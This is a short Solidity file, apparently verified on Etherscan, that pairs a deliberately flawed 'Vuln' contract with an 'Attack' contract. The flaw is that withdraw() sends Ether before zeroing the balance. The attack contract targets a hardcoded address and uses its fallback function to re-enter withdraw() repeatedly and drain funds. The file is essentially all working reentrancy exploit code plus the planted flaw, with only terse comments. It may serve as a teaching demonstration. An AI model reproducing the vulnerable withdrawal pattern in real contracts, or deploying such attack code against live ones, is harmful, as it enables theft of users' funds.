/**
 *Submitted for verification at Etherscan.io on 2021-11-29
*/

pragma solidity ^0.5.0;

// Vulnerable contract object
contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}

// Attack contract
contract Attack {
    // Obtain object of the vulnerable contract
    Vuln vulnContract = Vuln(0x36A540E3A78084962B75E25877CfACf8846Be018);
    uint counter = 0;

    function deposit() public payable {
        // Deposit the sent ETH into the vulnerable contract
        vulnContract.deposit.value(msg.value)();
        // Withdraw the ETH that was just sent above
        vulnContract.withdraw();
    }

    // Fallback function that is called whenever any Ether is sent to this Attack contract
    // This is called immediately after Attack.deposit()
    function () external payable {
        // Call the withdraw() function of the vulnerable contract rapidly
        while (counter < 3) {
            counter++;
            vulnContract.withdraw();
        }
    }
}